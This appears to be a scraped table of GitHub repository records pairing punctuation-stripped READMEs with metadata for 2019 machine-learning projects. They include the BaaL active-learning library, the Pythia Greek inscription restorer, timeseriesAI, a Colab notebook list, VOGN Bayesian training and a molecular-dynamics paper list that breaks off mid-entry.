networks In this method the dropout layer is used both in training and test time By running the model multiple times whilst randomly dropping weights we calculate the uncertainty of the prediction using one of the uncertainty measurements in src baal active heuristics py The framework consists of four main parts as demonstrated in the flowchart below ActiveLearningDataset Heuristics ModelWrapper ActiveLearningLoop To get started wrap your dataset in our ActiveLearningDataset src baal active dataset py class This will ensure that the dataset is split into training and pool sets The pool set represents the portion of the training set which is yet to be labelled We provide a lightweight object ModelWrapper src baal modelwrapper py similar to keras Model to make it easier to train and test the model If your model is not ready for active learning we provide Modules to prepare them For example the MCDropoutModule src baal bayesian dropout py wrapper changes the existing dropout layer to be used in both training and inference time and the ModelWrapper makes the specifies the number of iterations to run at training and inference In conclusion your script should be similar to this python dataset ActiveLearningDataset yourdataset dataset labelrandomly INITIALPOOL label some data model MCDropoutModule yourmodel model ModelWrapper model yourcriterion activeloop ActiveLearningLoop dataset getprobabilities model predictondataset heuristic heuristics BALD shuffleprop 0 1 ndatatolabel NDATATOLABEL for alstep in range NALSTEP model trainondataset dataset optimizer BATCHSIZE usecuda usecuda if not activeloop step We re done break For a complete experiment we provide experiments experiments to understand how to write an active training process Generally we use the ActiveLearningLoop provided at src baal active activeloop py src baal active activeloop py This class provides functionality to get the predictions on the unlabeled pool after each few epoch s and sort the next set of data items to be labeled based on the calculated uncertainty of the pool Roadmap Subject to change depending on the community x Initial FOSS release with MCDropout Gal et al 2015 x MCDropConnect Mobiny et al 2019 Bayesian layers Shridhar et al 2019 Unsupervised methods NNGP Panov et al 2019 SWAG Zellers et al 2018 Re run our Experiments bash nvidia docker build target basebaal t baal nvidia docker run rm baal python3 experiments vggmcdropoutcifar10 py Use BaaL for YOUR Experiments Simply clone the repo and create your own experiment script similar to the example at experiments vggexperiment py Make sure to use the four main parts of BaaL framework Happy running experiments Dev install Simply build the Dockerfile as below bash git clone git github com ElementAI baal git nvidia docker build target basebaal t baal dev Now you have all the requirements to start contributing to BaaL YEAH Contributing To contribute see CONTRIBUTING md CONTRIBUTING md Who We Are There is passion yet peace serenity yet emotion chaos yet order At ElementAI the BaaL team tests and implements the most recent papers on uncertainty estimation and active learning The BaaL team is here to serve you Parmida Atighehchian mailto parmida elementai com Frdric Branchaud Charron mailto frederic branchaud charron elementai com Jan Freyberg mailto jan freyberg elementai com Rafael Pardinas mailto rafael pardinas elementai com Lorne Schell mailto lorne schell elementai com Licence To get information on licence of this API please read LICENCE LICENSE,2019-09-30T20:16:26Z,2019-12-11T08:47:27Z,Python,ElementAI,Organization,9,135,9,40,master,Dref360#parmidaatg#rafapi#janfreyberg#archydeberker,5,1,1,2,7,1,24
2prime,ODE-DL,n/a,Paper List ODE Based Analysis For Deep Learning Paper List link Computer Vision Papers Image Processing link Deep Learning For Physics Paper List link,2019-10-22T20:02:53Z,2019-12-09T03:33:22Z,n/a,2prime,User,12,119,5,17,master,2prime,1,0,0,1,1,0,2
sommerschield,ancient-text-restoration,n/a,Restoring ancient text using deep learning A case study on Greek epigraphy Yannis Assael Thea Sommerschield Jonathan Prag Ancient History relies on disciplines such as Epigraphy the study of ancient inscribed texts for evidence of the recorded past However these texts inscriptions are often damaged over the centuries and illegible parts of the text must be restored by specialists known as epigraphists This work presents a novel assistive method for providing text restorations using deep neural networks To the best of our knowledge Pythia is the first ancient text restoration model that recovers missing characters from a damaged text input Its architecture is carefully designed to handle long term context information and deal efficiently with missing or corrupted character and word representations To train it we wrote a non trivial pipeline to convert PHI the largest digital corpus of ancient Greek inscriptions to machine actionable text which we call PHI ML On PHI ML Pythia s predictions achieve a 30 1 character error rate compared to the 57 3 of human epigraphists Moreover in 73 5 of cases the ground truth sequence was among the Top 20 hypotheses of Pythia which effectively demonstrates the impact of such an assistive method on the field of digital epigraphy and sets the state of the art in ancient text restoration Pythia Bi Word processing the phrase mdn gan nothing in excess a fabled maxim inscribed on Apollo s temple in Delphi The letters are missing and annotated with Since word contains missing characters its embedding is treated as unknown unk The decoder outputs correctly References arXiv pre print https arxiv org abs 1910 06262 EMNLP IJCNLP 2019 https www aclweb org anthology D19 1668 When using any of this project s source code please cite inproceedingsassael2019restoring title Restoring ancient text using deep learning a case study on Greek epigraphy author Assael Yannis and Sommerschield Thea and Prag Jonathan booktitle Empirical Methods in Natural Language Processing pages 6369 6376 year 2019 Pythia online To aid further research in the field we created an online interactive python notebook where researchers can query one of our models to get text restorations and visualise the attention weights Google Colab https colab research google com drive 16RfCpZLm0M6bf3eGIA7VUPclFdW8P8pZ Pythia offline The following snippets provide references for regenerating PHI ML and training new models offline Dependencies pip install r requirements txt python m nltk downloader punkts PHI ML dataset generation Download PHI this will take a while python c import pythia data phidownload pythia data phidownload main Process and generate PHI ML python c import pythia data phiprocess pythia data phiprocess main Training python c import pythia train pythia train main Evaluation python c import pythia test pythia test main loadcheckpoint yourmodelpath Docker execution build sh run sh python c import pythia train pythia train main License Apache License Version 2 0 Damaged inscription a decree concerning the Acropolis of Athens 485 4 BCE IG I3 4B CC BY SA 3 0 WikiMedia,2019-10-07T09:22:42Z,2019-12-12T20:43:31Z,Python,sommerschield,User,10,113,23,10,master,sommerschield#iassael#todd-cook,3,0,0,0,0,1,1
timeseriesAI,timeseriesAI,deep-learning#fastai#pytorch#rocket#sequential#sequential-data#state-of-the-art#time-series#time-series-classification#time-series-regression#timeseries#tsc,timeseriesAI timeseriesAI is a library built on top of fastai Pytorch to help you apply Deep Learning to your time series sequential datasets in particular Time Series Classification TSC and Time Series Regression TSR problems The library contains 3 major components 1 Notebooks they are very practical and show you how certain techniques can be easily applied 2 fastaitimeseries it s an extension of fastai s library that focuses on time series sequential problems 3 torchtimeseries models it s a collection of some state of the art time series sequential models The 3 components of this library will keep growing in the future as new techniques are added and or new state of the art models appear In those cases I will keep adding notebooks to demonstrate how you can apply them in a practical way Notebooks 1 Introduction to Time Series Classification TSC This is an intro that nb that shows you how you can achieve high performance in 4 simple steps 2 UCRTCS The UCR datasets are broadly used in TSC problems as s bechmark to measure performance This notebook will allow you to test any of the available datasets with the model of your choice and any training scheme You can easily tweak any of them to try to beat a SOTA 3 New TS data augmentations You will see how you can apply successful data augmentation techniques like mixup cutout and cutmix to time series problems 4 The importance of scaling In this notebook you ll learn more about the options to scale your data and the impact it may have on performance which is huge 5 Multivariate ROCKET on GPU On October 29 2019 there was a major milestone in the area of Time Series Classification A new method called ROCKET RandOm Convolutional KErnel Transform was released Dempster A Petitjean F Webb GI 2019 ROCKET Exceptionally fast and accurate time series classification using random convolutional kernels https arxiv org pdf 1910 13051 together with the code they used This new method not only beat the previous recognized state of the art HIVE COTE on a TSC benchmark but it does it in record time many orders of magnitude faster than any other method Ive been using it for a couple of days and the results are IMPRESSIVE The release code however has 2 limitations it can only handle univariate time series it doesnt support GPU I have developed ROCKET with GPU support in Pytorch that you can now use it with univariate of multivariate time series In this notebook you will see how you can use ROCKET in your time series problems 6 TS data augmentations single item transforms UPDATED with new tfms GPU tfms and RandAugment In this notebook you ll find some TS transforms that can be used to augment your data Most of the transforms are adapted from inspired by research papers on time series augmentation Transforms include TSjittering TSmagscale TSmagwarp TStimenoise TStimewarp TSlookback TStimestepsout TSchannelout TScutout TScrop TSwindowslice and TSzoom UPDATED I have now updated all tfms so that we can use them as regular tfms or pass them to a DataLoader and use them as a batch transform which is much faster I have also included RandAugment a new technique developed by Google to eliminate the data augmentation search phase This applies a random data augmentation to each individual batch,2019-09-30T09:18:31Z,2019-12-14T00:34:56Z,Jupyter Notebook,timeseriesAI,Organization,11,108,23,30,master,oguiza,1,0,0,0,6,0,0
toxtli,awesome-machine-learning-jupyter-notebooks-for-colab,awesome#awesome-list#awesome-lists#deep-learning#jupyter-notebook#jupyter-notebooks#machine-learning,Logo awesome png https www carlostoxtli com awesome Awesome Machine Learning Jupyter Notebooks for Google Colaboratory Awesome https cdn rawgit com sindresorhus awesome d7305f38d29fed78fa85652e3a63e154dd8e8829 media badge svg https github com sindresorhus awesome A curated list of Machine Learning and Deep Learning tutorials in Jupyter Notebook format ready to run in Google Colaboratory You can find the credits for the authors in the header of each Jupyter Notebook Contents Machine Learning machine learning Deep Learning deep learning Reinforcement Learning reinforcement learning Machine Learning Supervised Learning plots https www google com url q https colab research google com drive 1gmZWE7Tynhx1g9vzeqyaMPdO0pdwLmuJ sa D ust 1571021489211000 Unsupervised Learning plots https www google com url q https colab research google com drive 1yWT08sgqswCkuZx06EH3qdZcWTPp2Wvt sa D ust 1571021489212000 Machine Learning Basic concepts 1 https www google com url q https colab research google com drive 1ZgDgOcb4NR u62cFMdZJBPXux95E4wZt sa D ust 1571021489213000 2 https www google com url q https colab research google com drive 12X03Yz5OmryN9FnuhLvgMe8khB7RUC5 sa D ust 1571021489213000 3 https www google com url q https colab research google com drive 1ldHvgs9qeNIWBCxT0U8OT9SkSisVd4sj sa D ust 1571021489213000 4 https www google com url q https colab research google com drive 16gJHuKOc2 cCLXsNhZ7DW89nFG1NP sa D ust 1571021489213000 Linear Regression 1 https www google com url q https colab research google com drive 1 dTb2vCiZHa DnyqlVFGOnMSNjvkIOTP sa D ust 1571021489214000 2 https www google com url q https colab research google com drive 1Z20iJspQm2YwLI51wgE6nXGOSu1kG4W sa D ust 1571021489214000 3 https www google com url q https colab research google com drive 1 yk3m6p3ylNLtTaEf3nya6exOwv8fL sa D ust 1571021489214000 Decision Trees 1 https www google com url q https colab research google com drive 1Fc8qs1fwdcpoZ tTj32OBl tCGlAe5c sa D ust 1571021489215000 Random Forest 1 https www google com url q https colab research google com drive 1WMOOtaHAMZPi enVM8RRMCC grEtm9P sa D ust 1571021489215000 2 https www google com url q https colab research google com drive 1jDdWp CJybMJDX17jBmG5qoPPg9qj1sm sa D ust 1571021489215000 3 https www google com url q https colab research google com drive 1 uDIRl1aYqmJX59rAJumHY1T20QqBJiQ sa D ust 1571021489216000 4 https www google com url q https colab research google com drive 1 uDIRl1aYqmJX59rAJumHY1T20QqBJiQ sa D ust 1571021489216000 Naive Bayes 1 https www google com url q https colab research google com drive 1qOCllKsBBrLeUnP XAXHefXCtbuBWl69 sa D ust 1571021489216000 2 https www google com url q https colab research google com drive 11FiWH00vzygQp1TpD0MCfMFg6FYsd01 sa D ust 1571021489217000 k Nearest Neighbor 1 https www google com url q https colab research google com drive 1GeUVjDW74SxFxz2Nh3rqOlte S2dblYv sa D ust 1571021489217000 2 https www google com url q https colab research google com drive 1X12qds10ZfN7QCrmpRR2OXxa PTyS5e sa D ust 1571021489218000 k Means 1 https www google com url q https colab research google com drive 1RL3oZm6LgnEChI1aOQZoMn1WDk DQJiV sa D ust 1571021489218000 2 https www google com url q https colab research google com drive 1yvy1scktjcDyydG2fZz2OJfRFAer0SEO sa D ust 1571021489218000 3 https www google com url q https colab research google com drive 1CzEf6giBXPSQI5UJOhZrZfYKAJcH68wg sa D ust 1571021489218000 Support Vector Machines 1 https www google com url q https colab research google com drive 13PRk GKeSivp4R FIdjmYBQS7xWUco9C sa D ust 1571021489219000 Logistic Regression 1 https www google com url q https colab research google com drive 1PWmvsZRaj3JQ8rtj6vlwhJhJpOrIAamT sa D ust 1571021489219000 2 https www google com url q https colab research google com drive 1p8rcrSQB thLSakUmCHjSbqI6vd NkCq sa D ust 1571021489220000 3 https www google com url q https colab research google com drive 1jhrAtmPgg6Uu0WzMzV VakWlncQAvk D sa D ust 1571021489220000 Perceptron 1 https www google com url q https colab research google com drive 10PvUh 8ZsVqQADqXSmRIDHGiCH9iypyO sa D ust 1571021489220000 Machine Learning Overview 1 https www google com url q https colab research google com drive 1s6cBKRS M0NUtgGhMtbJvGVH5Zusw3w sa D ust 1571021489220000 Principal Component Analysis 1 https www google com url q https colab research google com drive 1CO6BACds6J8hGPYlEU2INnSTpT0EmS74 sa D ust 1571021489221000 2 https www google com url q https colab research google com drive 1VU2SO3IfklPkK1EPMnwiO7trJslt79OZ sa D ust 1571021489221000 Topic modeling 1 https www google com url q https colab research google com drive 12O3tgKY6uppbEVL1PzGRfbo7w69RLQu sa D ust 1571021489221000 Ensembles 1 https www google com url q https colab research google com drive 1KgnHBmUGQ1zepU wZlDwMyM YrlMTUX sa D ust 1571021489233000 2 https www google com url q https colab research google com drive 1U86EVD 6ulYMxTzDX8 m6nEptYq0yaej sa D ust 1571021489233000 Deep Learning GPU testing 1 https www google com url q https colab research google com drive 17vJw LAGhA6OT8KGar8h22NY4STruCSq sa D ust 1571021489222000 Artificial Neural Networks from scratch 1 https www google com url q https colab research google com drive 1Vfz7XMI9oubrsQSwN3ZbMC6phrJJKC sa D ust 1571021489222000 ANN Activation functions 1 https www google com url q https colab research google com drive 1XQHKjJJs7pWsqCenAiLPx8Y JnqQrO48 sa D ust 1571021489223000 ANN Loss functions 1 https www google com url q https colab research google com drive 1YHa7WNP2hwStfV0CQFJI9SgZIxX4YbB sa D ust 1571021489223000 ANN Gradients 1 https www google com url q https colab research google com drive 1xQ1TdpeaLCYnaglR2C8ilRl2J nYO0 sa D ust 1571021489223000 2 https www google com url q https colab research google com drive 1FSepBy85HBrHa8t8aoxY5HKuz4sJ4CAo sa D ust 1571021489223000 ANN Optimizers 1 https www google com url q https colab research google com drive 1i4JZOghgXSf98ty2wybcTHm4FkRsJMyM sa D ust 1571021489224000 ANN Decision Boundaries 1 https www google com url q https colab research google com drive 1s9Sk2bf7QjNxgiilprauXNCigvmG3Rd8 sa D ust 1571021489224000 ANN Overfitting 1 https www google com url q https colab research google com drive 1wFUEfNhy3azhMS5EWZK7c7frpzS5XN sa D ust 1571021489224000 2 https www google com url q https colab research google com drive 1QBEtDv70bBYchu2508OJYC0dXVrUaD sa D ust 1571021489225000 ANN Regularization 1 https www google com url q https colab research google com drive 1Scpx9rb800 hVhjF F E8YeTPWTIyQAq sa D ust 1571021489225000 Multi Layer Perceptron 1 https www google com url q https colab research google com drive 1GAYf5yMNBkVrag0z2Q4MPSwuqfRN1Wz 23scrollTo 3Ds4VYW0i94Wn sa D ust 1571021489225000 2 https www google com url q https colab research google com drive 12YBDQFYXN8VruxKTfzDpbPsYFAEQceQP sa D ust 1571021489226000 3 https www google com url q https colab research google com drive 1pyRqGmMG4 Mj8Wis5XrQa4dUJvYln1g sa D ust 1571021489226000 4 https www google com url q https colab research google com drive 1wHjugM56k0ay5QCmRVMBfAMF96EY7A5k sa D ust 1571021489226000 5 https www google com url q https colab research google com drive 1Ly0BtKBphUdeqMQBO8Xjweku62Vq3UAX sa D ust 1571021489226000 Convolutional Neural Networks 1 https www google com url q https colab research google com drive 1jN8oswBOds4XuRbnQMxxDXDssmDDrD9 sa D ust 1571021489227000 2 https www google com url q https colab research google com drive 1iEYJs75hatURxshmCBMGzHQo5VgdRvN 23scrollTo 3DQ4UZVi3DYqbr sa D ust 1571021489227000 3 https www google com url q https colab research google com drive 1YHKZgpJuriGYjEzFDNGz2Hf0widu exx sa D ust 1571021489227000 4 https www google com url q https colab research google com drive 1gi2Or0rDz5Gg9FkGJjFDxgeiwt5 lXm sa D ust 1571021489227000 5 https www google com url q https colab research google com drive 1QcnY LOZU9c7Sp2DsDVeYxLNBx87VNhn sa D ust 1571021489228000 6 https www google com url q https colab research google com drive 1Il7eimZ5bxQh1qem NLiwoMBugODltSI sa D ust 1571021489228000 7 https www google com url q https colab research google com drive 1YHKZgpJuriGYjEzFDNGz2Hf0widu exx sa D ust 1571021489228000 8 https www google com url q https colab research google com drive 1iEYJs75hatURxshmCBMGzHQo5VgdRvN sa D ust 1571021489229000 9 https www google com url q https colab research google com drive 1w9GxDTBATF6Cc1582V6uU2OKdQGnp0J sa D ust 1571021489229000 CNN from scratch 1 https www google com url q https colab research google com drive 1RqD0OMGFcKBiVIyZIr1qfvM edWLPY64 sa D ust 1571021489229000 Data Augmentation 1 https www google com url q https colab research google com drive 1ANIc7tXrggPT2I9JzpBlZQ3BBhCpbJUJ sa D ust 1571021489230000 2 https www google com url q https colab research google com drive 1cQRVdiDc9xraHZYLu3VrXxX4FKXoaS8U sa D ust 1571021489230000 3 https www google com url q https colab research google com drive 1O5far2FC4GlAc9pkLPZqsjKreCpI4S sa D ust 1571021489230000 Recurrent Neural Networks 1 https www google com url q https colab research google com drive 1twc5dBjgFLFuv8p gPfnrscTPcBlkx5q sa D ust 1571021489231000 2 https www google com url q https colab research google com drive 10 ou Za75bFgwArvgP3QfNJ4cWuwY eF sa D ust 1571021489231000 3 https www google com url q https colab research google com drive 1PEOqq8mBcmc FMj8lpbVF93cQI4RLgVJ sa D ust 1571021489231000 4 https www google com url q https colab research google com drive 1XUEAFxxKVmdgC7oPOzVpGInXfUeTcgIQ sa D ust 1571021489231000 5 https www google com url q https colab research google com drive 1tfDDriSDUhJ9OHwjt NzT8xRiEDQF7x sa D ust 1571021489232000 Autoencoders 1 https www google com url q https colab research google com drive 1QxXqnhyqIZrrGtor2tVa4jY63adS4yc0 sa D ust 1571021489232000 Generative Adversarial Networks 1 https www google com url q https colab research google com drive 1YOYH78YQAgPBRIpUPhhe0cFLNu BPVo sa D ust 1571021489232000 2 https www google com url q https colab research google com drive 1POZpWN 2M5hy3D2ATWzJs2LC5sk7hpts sa D ust 1571021489232000 3 https www google com url q https colab research google com drive 1aKywiJ5p0eCwDIIWKe8Q205rcKqmRVX sa D ust 1571021489233000 4 https www google com url q https colab research google com drive 1QxXqnhyqIZrrGtor2tVa4jY63adS4yc0 sa D ust 1571021489233000 5 https www google com url q https colab research google com drive 1Lw7BqKABvtiSyUHg9DeM5f90WFGB7uz sa D ust 1571021489233000 AutoML 1 https www google com url q https colab research google com drive 1gTBDfbJy9SsgbUPRhLmrujw6HC2BjxN sa D ust 1571021489234000 2 https www google com url q https colab research google com drive 17Ii6Nw89gZT8lXrvSQhNWaaVfcdLBn sa D ust 1571021489234000 3 https www google com url q https colab research google com drive 1xe4GdqsPMq0n3wMqlm 39j5TMUqHJR sa D ust 1571021489234000 Reinforcement Learning Reinforcement Learning 1 https www google com url q https colab research google com drive 1fgv5UWhHR7xSwZfwwltF4OFDYqtWdlQD sa D ust 1571021489235000 2 https www google com url q https colab research google com drive 14aYmND2LKtaPTW3JWS7scKGwU9baxHeE sa D ust 1571021489235000 3 https www google com url q https colab research google com drive 16Scl43smvcXGZFEGITs15SN7 EidZd sa D ust 1571021489235000 Contribute Contributions welcome Read the contribution guidelines CONTRIBUTING md first License CC0 http mirrors creativecommons org presskit buttons 88x31 svg cc zero svg http creativecommons org publicdomain zero 1 0,2019-10-14T01:50:30Z,2019-12-14T14:43:22Z,Jupyter Notebook,toxtli,User,4,89,23,15,master,toxtli,1,0,0,0,0,0,1
team-approx-bayes,dl-with-bayes,n/a,Practical Deep Learning with Bayesian Principles This repository contains code that demonstrate practical applications of Bayesian principles to Deep Learning Our implementation contains an Adam like optimizer called VOGN http proceedings mlr press v80 khan18a html to obtain uncertainty in Deep Learning 2D binary classification see toy example toyexample Image classification MNIST classification CIFAR 10 100 classification and ImageNet distributed classification Continual learning for image classification permuted MNIST Per pixel semantic labeling segmentation Cityscapes Setup This repository uses PyTorch SSO https github com cybertronai pytorch sso a PyTorch extension for second order optimization variational inference and distributed training bash git clone git github com cybertronai pytorch sso git cd pytorch sso python setup py install Please follow the Installation https github com cybertronai pytorch sso installation of PyTorch SSO for CUDA MPI support Bayesian Uncertainty Estimation Decision boundary and entropy plots on 2D binary classification by MLPs trained with Adam and VOGN docs boundary gif VOGN optimizes the posterior distribution of each weight i e mean and variance of the Gaussian A model with the mean weights draws the red boundary and models with the MC samples from the posterior distribution draw light red boundaries VOGN converges to a similar solution as Adam while keeping uncertainty in its predictions With PyTorch SSO torchsso you can run VOGN training by changing a line in your train script diff import torch import torchsso trainloader torch utils data DataLoader traindataset model MLP optimizer torch optim Adam model parameters optimizer torchsso optim VOGN model datasetsize len trainloader dataset for data target in trainloader def closure optimizer zerograd output model data loss F binarycrossentropywithlogits output target loss backward return loss output loss output optimizer step closure To train MLPs by VOGN and Adam and create GIF bash cd toyexample python main py For detail please see VOGN implementation in PyTorch SSO https github com cybertronai pytorch sso blob master torchsso optim vi py Bayes for Image Classification This repository contains code for the NeurIPS 2019 paper Practical Deep Learning with Bayesian Principles https arxiv org abs 1906 02506 poster neurips2019poster pdf which includes the results of Large scale Variational Inference on ImageNet classification docs curves png VOGN achieves similar performance in about the same number of epochs as Adam and SGD Importantly the benefits of Bayesian principles are preserved predictive probabilities are well calibrated rightmost figure uncertainties on out of distribution data are improved please refer the paper and continual learning performance is boosted please refer the paper an example is to be prepared See classification classification single CPU GPU or distributed classification distributed classification multiple GPUs for example scripts Citation NeurIPS 2019 paper articleosawa2019practical title Practical Deep Learning with Bayesian Principles author Osawa Kazuki and Swaroop Siddharth and Jain Anirudh and Eschenhagen Runa and Turner Richard E and Yokota Rio and Khan Mohammad Emtiyaz journal arXiv preprint arXiv 1906 02506 year 2019,2019-10-27T04:06:14Z,2019-12-14T10:46:53Z,Python,team-approx-bayes,Organization,5,86,4,25,master,kazukiosawa#emtiyaz,2,0,0,1,0,0,0
sha256feng,mldl-md-dynamics,n/a,Awesome machine learning deep learning in molecular dynamics A repository of update in molecular dynamics field by recent progress in machine learning and deep learning Those efforts are cast into the following categories 1 Learn force field or molecular interactions learnff 2 Enhanced sampling methods enhancesamp 3 Learn collective variable cv 4 Learn kinetic model kinetic 5 Capture dynamics of molecular system dynamic 6 Map between all atoms and coarse grain cg 7 Design proteins designprot 8 Protein ligand prediction for drug discovery drugdisco nbsp Picture from Machine learning molecular dynamics for the simulation of infrared spectra nbsp 1 Learn force field or molecular interactions Molecular Graph Convolutions Moving Beyond Fingerprints https arxiv org abs 1603 00856 Steven Kearnes Kevin McCloskey Marc Berndl Vijay Pande Patrick Riley 2016 This paper from Standford Univ and Google proposed graph representation of molecules and graph convolution to capture the interactions in the molecule The authors used a weave module where the atom feature and edge feature are weaved to preserve invariance of atom and pair permutation They used Gaussian membership functions to preserve overall order invariance An implementation of artificial neural network potentials for atomistic materials simulations Performance for TiO2 https doi org 10 1016 j commatsci 2015 11 047 NongnuchArtrith Alexander Urban 2016 The authors from UC Berkeley developed open source atomic energy network package based on Behler Parrinello machine learning potential which uses multilayer perceptron to learn the potential of molecules The atomic coordinates are transformed into invariant representation of the local atomic environments and potential is trained on such representation The authors applied the model to TiO2 ZrO2 and alpha PbO2 Chemception A Deep Neural Network with Minimal Chemistry Knowledge Matches the Performance of Expert developed QSAR QSPR Models https arxiv org abs 1706 06689 Garrett B Goh Charles Siegel Abhinav Vishnu Nathan O Hodas Nathan Baker 2017 The authors from Pacific Northwest National Laboratory developed this computer vision based model for chemicals By converting SMILES strings to images and encoding atom properties through color channels the model slightly outperforms ECFP fingerprints based deep NN in activity and solvation and slightly underforms in toxicity prediction Machine learning prediction errors better than DFT accuracy https arxiv org abs 1702 05532 Felix A Faber Luke Hutchison Bing Huang Justin Gilmer Samuel S Schoenholz George E Dahl Oriol Vinyals Steven Kearnes Patrick F Riley O Anatole von Lilienfeld 2017 The authors from Univ of Basel and Google used elastic network bayesian regression random forest kernel ridge regression gated graph NN graph convolutions to predict QM9 data set The representations are Coulomb matrix BAML bonds angles machine learning ECFP4 extended connectivity fingerprints MARAD molecular atomic radial angular distribution HD HDA HDAD histogram methods They demonstrated the machine learning methods have smaller error than DFT error Quantum Chemical Insights from Deep Tensor Neural Networks https www nature com articles ncomms13890 Kristof T Schtt Farhad Arbabzadah Stefan Chmiela Klaus R Mller Alexandre Tkatchenko 2017 The authors from Technische Universitat Berlin Korea Univ Fritz Haber Institut der Max Planck Gesellschaft and Univ of Luxembourg developed DTNN The network used atom features and edge features for input Edges are processed by Gaussian expansion The edges and atoms interact through an interaction module through tensor multiplications The authors applied this to predict chemical potentials ring stability of molecules etc Machine learning molecular dynamics for the simulation of infrared spectra https pubs rsc org en content articlelanding 2017 sc c7sc02267k Michael Gastegger Jrg Behler Philipp Marquet 2017 The authors from Univ of Vienna and Universitt Gttingen developed a molecular dipole moment model based on environment dependent NN and combined with NN potential approach of Behler and Parrinello for ab inito MD As an application they obtained accurate models for predicting infrared spectra ANI 1 an extensible neural network potential with DFT accuracy at force field computational cost https doi org 10 1039 c6sc05720a J S Smith Isayev A E Roitberg 2017 This paper from Univ of Florida and Univ of North Carolina presented ANI 1 which used Behler and Parrinello symmetry functions to build single atom atomic environment vectors AEV as molecular representation This is similar to the context representation of work in NLP ElemNet Deep Learning the Chemistry of Materials From Only Elemental Composition https www nature com articles s41598 018 35934 y Dipendra Jha Logan Ward Arindam Paul Wei keng Liao Alok Choudhary Chris Wolverton Ankit Agrawal 2018 The authors from Northwestern Univ Univ of Chicago developed ElemNet which takes elemental compositions and used 17 layer MLP architecture to predict DFT computed formation enthalpies for quantuam materials The authors visualized 1st 2nd and 8th layers of the network to elucidate the chemistry insights that the model learned Towards exact molecular dynamics simulations with machine learned force fields https www nature com articles s41467 018 06169 2 Stefan Chmiela Huziel E Sauceda Klaus Robert Muller Alexandre Tkatchenko 2018 The authors from Technische Universitt Berlin Fritz Haber Institut der Max Planck Gesellschaft Korea Univ and Univ of Luxembourg developed a kernel based symmetric gradient domain ML sGDML model to reproduce global force fields at CCSD T level of accuracy It allows converged MD simulations with fully quantized electrons and nuclei This work built on their previous work GDML with symmetry imposed in the current sGDML The authors constructed FF in this 2019 JCP paper https doi org 10 1063 1 5078687 Applying machine learning techniques to predict the propertiesof energetic materials https arxiv org abs 1801 04900 Daniel C Elton Zois Boukouvalas Mark S Butrico Mark D Fuge Peter W Chung 2018 The authors from Univ of Maryland applied several machine learning methods KRR ridge SVR RF k nearest neighbor based on features sum over bonds custom descriptors Coulomb matrices Bag of Bonds and fingerprints They concluded the best featurization is sum over bonds and best model is kernel ridge regression Deep Potential Molecular Dynamics A Scalable Model with the Accuracy of Quantum Mechanics https journals aps org prl abstract 10 1103 PhysRevLett 120 143001 Linfeng Zhang Jiequn Han Han Wang Roberto Car Weinan E 2018 The authors from Peking Univ Princeton Univ and Institute of Applied Physics and Computational Mathematics China developed DeepMD method based on a many body potential and interatomic forces generated by NN which is trained with ab initio data Neural Message Passing with Edge Updates for Predicting Properties of Molecules and Materials https arxiv org abs 1806 03146 Peter Bjrn Jrgensen Karsten Wedel Jacobsen Mikkel N Schmidt 2018 This paper from Univ of Denmark extended neural message passing model with an edge update NN so that information exchanges between atoms depend on hidden state of the receiving atom They also explored ways to construct the graph SchNet A deep learning architecture for molecules and materials https aip scitation org doi 10 1063 1 5019779 K T Schtt H E Sauceda P J Kindermans A Tkatchenko K R Mller 2018 This paper from Technische Universita t Berlin Univ of Luxembourg Max Planck Institute and Korea University presented SchNet a variant of DTNN to learn the molecular properties and studied local chemical potential and the dynamics of C20 fullerene Pixel Chem A Representation for Predicting Material Properties with Neural Network https openreview net pdf id SkxYOiCqKX Shuqian Ye Yanheng Xu Jiechun Liang Hao Xu Shuhong Cai Shixin Liu Xi Zhu 2019 The authors designed a Pixel Chemistry network to learn a representation for predicting molecular properties The authors proposed three new matrices which reflect charge transfer ability bond binding strength and Euclidean distances between atoms They also designed an angular interaction matrix A describes the interaction between two atomic orbitals Message passing neural networks for high throughput polymer screening https aip scitation org doi 10 1063 1 5099132 Peter C St John1 Caleb Phillips Travis W Kemper A Nolan Wilson Yanfei Guan Michael F Crowley Mark R Nimlos Ross E Larsen 2019 This paper from National Renewable Energy Lab USA used message passing NN to predict polymer properties for screening purpose They focused on larger molecules and tested the model with without 3D conformation information since accurate 3D structure calculation is also expensive Accurate and transferable multitask prediction of chemical properties with an atoms in molecules neural network https advances sciencemag org content 5 8 eaav6490 Roman Zubatyuk Justin S Smith Jerzy Leszczynski and Olexandr Isayev 2019 This paper from Univ of North Carolina Los Alamos National Lab and Jackson State Univ presented AIMNet to leearn implicit solvation energy in MNSol database Atoms in molecules are embedded and interact with each in several layers LanczosNet Multi Scale Deep Graph Convolutional Networks https arxiv org abs 1901 01484 Renjie Liao Zhizhen Zhao Raquel Urtasun Richard S Zemel 2019 The authors from Univ of Toronto Uber ATG Vector Institute UIUC and Canadian Institute of Advanced Research developed this spectral based graph NN which uses Lanczos algorithms to construct low rank approximations of the graph Laplacian They benchmarked the model on citation networks and QM8 dataset Molecule Augmented Attention Transformer https grlearning github io papers 105 pdf ukasz Maziarka Tomasz Danel Sawomir Mucha Krzysztof Rataj Jacek Tabor Stanisaw Jastrzebski 2019 The authors from Jagiellonian Univ Ardigen and New York Univ designed this MAT graph NN model with self attention mimicking the Transformer consisting of multiple blocks of layer norm multi head self attention and residual net The model achieved comparable or better results on BBBP and FreeSolv datasets comparing with MPNN Machine Learning for Scent Learning Generalizable Perceptual Representations of Small Molecules https arxiv org abs 1910 10685 Benjamin Sanchez Lengeling Jennifer N Wei Brian K Lee Richard C Gerkin Aln Aspuru Guzik Alexander B Wiltschko 2019 This paper from Google Arizona State Univ Univ of Toronto Vector Institute Canadian Institute for Advanced Research used MPNN message passing NN based on graph representation to predict quantitative structure odor relationship QSOR very similar to QSAR The model out performed molecular fingerprint based methods The authors showed their learned embeddings from GNN capture a meaningful odor space representation ProDyn0 Inferring calponin homology domain stretching behavior using graph neural networks https arxiv org abs 1910 09738 Ali Madani Cyna Shirazinejad Jia Rui Ong Hengameh Shams Mohammad Mofrad 2019 This paper from UC Berkeley used MPNN and residual gated graph convnets to predict the pattern and mode of SMD steered MD simulation results The authors created this data set of 2020 mutants of calponin homology domain CH an actin binding domain with SMD simulation results Capturing the force between CH domains is capturing molecular interactions between amino acid residues 2 Enhanced sampling methods with ML DL Reinforced dynamics for enhanced sampling in large atomic and molecular systems https aip scitation org doi full 10 1063 1 5019675 Linfeng Zhang Han Wang Weinan E 2018 This paper from Peking Univ Princeton Univ and IAPCM China used reinforcement learning to calculate the biasing potential on the fly with data collected judiciously from exploration and an uncertainty indicator from NN serving as the reward function Reinforcement Learning Based Adaptive Sampling REAPing Rewards by Exploring 